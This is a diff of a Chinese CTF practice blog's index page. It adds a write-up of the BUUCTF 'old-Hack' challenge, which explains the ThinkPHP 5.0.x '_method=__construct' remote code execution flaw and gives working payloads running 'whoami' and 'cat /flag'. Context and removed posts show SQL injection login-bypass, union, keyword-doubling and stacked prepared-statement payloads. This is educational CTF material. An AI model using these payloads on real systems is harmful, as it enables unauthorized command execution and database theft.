@@ -277,6 +277,95 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-hack" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a  href="/2021/02/15/hack/" class="article-date">
+      <time datetime="2021-02-15T11:56:57.000Z" itemprop="datePublished">2021-02-15</time>
+</a>
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a  class="article-title" href="/2021/02/15/hack/">25-buu练习[BJDCTF 2nd]old-Hack 1</a>
+    </h1>
+  
+
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2>知识点</h2>
+<h3>ThinkPHP</h3>
+
+<p><b>ThinkPHP是一个免费开源的，快速、简单的面向对象的轻量级PHP开发框架，是为了敏捷WEB应用开发和简化企 业应用开发而诞生的。由于其简单易用，国内用户众多。</b><br>2019年1月11日ThinkPHP团队发布了版本更新，本次更新包含了一个可能GetShell的安全更新，具体内容为改进Request类的method方法。<br><b style="color:pink">漏洞描述</b><br>Thinphp团队在实现框架中的核心类Requests的method方法实现了表单请求类型伪装，默认为$_POST[‘_method’]变量，却没有对$_POST[‘_method’]属性进行严格校验，可以通过变量覆盖掉Requets类的属性并结合框架特性实现对任意函数的调用达到任意代码执行的效果。<br><b style="color:pink">漏洞危害</b><br>在未经授权的情况下远程攻击者构造特殊的请求可以在PHP上下文环境中执行任意系统命令，甚至完全控制网站，造成数据泄露，网站内容被修改。<br><b style="color:pink">影响范围</b><br>受影响版本：ThinkPHP 5.0.x<br>不受影响版本：ThinkPHP 5.0.24<br>在修复前的文件526行中，当存在$_POST[‘_method’]变量是将会执行 $this-&gt;{$this-&gt;method}($_POST)，当$_POST[‘_method’]为__construct时及等价于调用$this-&gt;_construct($_POST)_construct函数实现如下：<br><b style="color:pink">漏洞分析</b><br>在该函数中，当传入的参数中的key为该Requests属性，将value赋值给该属性，由于key可控制，可以到达属性覆盖的效果。<br><b style="color:pink">漏洞复现</b><br>通过git 可以快速搭建环境</p>
+<ul>
+<li>git clone https://github.com/top-think/think
+</li><li>
+git checkout v5.0.23
+</li><li>
+cd think
+</li><li>
+git clone https://github.com/top-think/framework thinkphp
+</li><li>
+cd thinkphp
+</li><li>
+git checkout v5.0.23
+</li></ul>
+
+<p>通过覆盖filter属性即可达到调用任意函数的效果。<br>Payload如下</p>
+<ul>
+<li>_method=__construct&filter[]=system&server[REQUEST_METHOD]=whoami
+</li></ul>
+
+<p>在早期5.0的版本过滤器的调用有差别payload也会不同<br>更详细内容参见；<a target="_blank" rel="noopener" href="https://www.cnblogs.com/yuzly/p/11460285.html">https://www.cnblogs.com/yuzly/p/11460285.html</a></p>
+<h2>题目</h2>
+
+<p>打开靶场<br><img src="/2021/02/15/hack/g0.png"><br>题目提示是thinkphp5<br>百度发现thinkphp5有原厂命令执行漏洞，详情在知识点中有多描述<br>构造payload：</p>
+<ul>
+<li>_method=__construct&filter[]=system&server[REQUEST_METHOD]=cat /flag
+</li></ul>
+
+<p><img src="/2021/02/15/hack/g.png"><br>得到flag~~</p>
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+
+
+  
     <article id="post-guge" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1123,124 +1212,6 @@ highlight_file(__FILE__);
       
           
         <p>打开靶机：<br><img src="/2021/01/31/baby/baby1.png"><br>emmmm应该是lovesql惹的祸吧，euuu网站被日原谅我不厚道地笑了，应该是个加强版的注入！<br>先输入用户名和密码，看看什么反应。<br><img src="/2021/01/31/baby/baby2.png"><br>额…整一手万能密码：闭合双引号:<br>?username=admin&amp;password=admin’ or ‘1’=’1<br><img src="/2021/01/31/baby/baby3.png"><br>euuuuu报错了，说密码错误，那重新重新构造pyload：<br>?username=admin’&amp;password=admin or ‘1’=’1<br>看看是否报错<br><img src="/2021/01/31/baby/baby4.png"><br>emmmm我们的or去哪里啦？于是进一步测试，发现过滤了好多关键字，比如or, select,where, union。应该是用函数replace给我们替换成了空白字符<br>知道了这样，我们就进行绕过，于是拼接字符，无法用order by 1来判断字段个数，我们只有使用联合查询看他是否能查出来，应该列数不太多，于是我们构造<br>pyload：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2%23<br><img src="/2021/01/31/baby/baby5.png"><br>eeee应该是列数不对，再次构造payload：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,3%23<br><img src="/2021/01/31/baby/baby6.png"><br>啊哈~对啦<br>可以看出有两个显示位：2和3<br>先查3的表：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(table_name)ffromrom infoorrmation_schema.tables wwherehere table_schema=database()%23<br><img src="/2021/01/31/baby/baby7.png"><br>查出来两张表b4bsql和geekuser<br>爆表b4bsql字段：<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(column_name)ffromrom infoorrmation_schema.columns wwherehere table_name=’b4bsql’%23<br><img src="/2021/01/31/baby/baby8.png"><br>查出三个列字段：id,username,password<br>最后查数据，当然是查密码了，flag就在里面，别问我为什么，问就是直觉！<br>?username=admin&amp;password=admin’ uunionnion sselectelect 1,2,group_concat(passwoorrd)ffromrom b4bsql%23<br><img src="/2021/01/31/baby/baby9.png"><br>成功得到flag！<br><img src="/2021/01/31/baby/baby10.gif"></p>
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-
-      
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-
-
-
-
-  
-    <article id="post-suibianzhu" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/01/30/suibianzhu/" class="article-date">
-      <time datetime="2021-01-30T07:14:19.000Z" itemprop="datePublished">2021-01-30</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/01/30/suibianzhu/">16-Buu练习[强网杯 2019]随便注</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p>打开题目，如下：<br><img src="/2021/01/30/suibianzhu/suibianzhu1.png"><br><b style="color:yellow">（一）常规测试</b></p>
-<p style="color:yellow">1、探测到有无注入</p>
-<ul>
-<li>1'   报错
-</li><li>1'#  正常且为True
-</li><li>1' and 1=1#  正常且为True
-</li><li>1' and 1=2#  正常且为False
-</li></ul>
-可以得知存在注入，并且参数使用单引号闭合。
-<p style="color:yellow">2、尝试获取列数</p>
-<ul>
-<li>1' order by 1#
-</li><li>1' order by 2#
-</li><li>1' order by 3#  报错
-</li></ul>
-得出列数为2
-<p style="color:yellow">3、尝试获取数据库名，用户名的基本信息</p>
-试试union查询
-<ul>
-<li>1'union select 1,2#
-</li></ul>
-
-<p>结果如下：<br><img src="/2021/01/30/suibianzhu/suibianzhu2.png"><br>这里过滤了select，也没有发现绕过select的地方<br><b style="color:yellow">（二）花式注入</b></p>
-<p style="color:yellow">1、获取数据库</p>
-<ul>
-<li>?inject=1';show databases;--+
-</li></ul>
-
-<p><img src="/2021/01/30/suibianzhu/suibianzhu3.png"></p>
-<p style="color:yellow">2、获取数据表</p>
-<ul>
-<li>?inject=1';show tables;--+
-</li></ul>
-
-<p><img src="/2021/01/30/suibianzhu/suibianzhu4.png"></p>
-<p style="color:yellow">3、查看列信息</p>
-<ul>
-<li>?inject=1';show columns from `1919810931114514`; --+
-</li></ul>
-
-<p><img src="/2021/01/30/suibianzhu/suibianzhu5.png"></p>
-<p><b>绕过select：</b><br>如果无法使用select，还是获得不了flag，可以通过预编译的方式绕过对select的限制。</p>
-<p>SQL 语句的执行处理<br>1、即时 SQL<br>　　一条 SQL 在 DB 接收到最终执行完毕返回，大致的过程如下：</p>
-<p>　　1. 词法和语义解析；<br>　　2. 优化 SQL 语句，制定执行计划；<br>　　3. 执行并返回结果；<br>如上，一条 SQL 直接是走流程处理，一次编译，单次运行，此类普通语句被称作 Immediate Statements （即时 SQL）。</p>
-<p>2、预处理 SQL<br>　　但是，绝大多数情况下，某需求某一条 SQL 语句可能会被反复调用执行，或者每次执行的时候只有个别的值不同（比如 select 的 where 子句值不同，update 的 set 子句值不同，insert 的 values 值不同）。如果每次都需要经过上面的词法语义解析、语句优化、制定执行计划等，则效率就明显不行了。<br>　　所谓预编译语句就是将此类 SQL 语句中的值用占位符替代，可以视为将 SQL 语句模板化或者说参数化，一般称这类语句叫Prepared Statements。<br>　　预编译语句的优势在于归纳为：一次编译、多次运行，省去了解析优化等过程；此外预编译语句能防止 SQL 注入。<br><b>预处理流程:</b></p>
-<ul>
-<li>SET;                                    # 用于设置变量名和值
-</li><li>PREPARE stmt_name FROM preparable_stmt;    # 用于预备一个语句，并赋予名称，以后可以引用该语句
-</li><li>EXECUTE stmt_name;                         # 执行语句
-</li><li>{DEALLOCATE | DROP} PREPARE stmt_name;    # 用来释放掉预处理的语句
-</li></ul>
-
-<p><b>构建payload：</b></p>
-<ul>
-<li>-1';
-</li><li>set @sql=CONCAT('se','lect * from `1919810931114514`;');
-</li><li>prepare stmt from @sql;
-</li><li>execute stmt;
-</li></ul>
-
-<p><img src="/2021/01/30/suibianzhu/suibianzhu6.png"><br>暗示set与prepare关键词被拦截，但是strstr函数对大小写敏感，尝试使用大写绕过：<br>-1’;<br>Set @sql=CONCAT(‘se’,’lect * from <code>1919810931114514</code>;’);<br>Prepare stmt from @sql;<br>execute stmt;#<br><img src="/2021/01/30/suibianzhu/suibianzhu7.png"><br>得到flag！<br>查看大佬的博客，使用1’ or 1=1#即可查询出flag，淦！</p>
 
       
     </div>
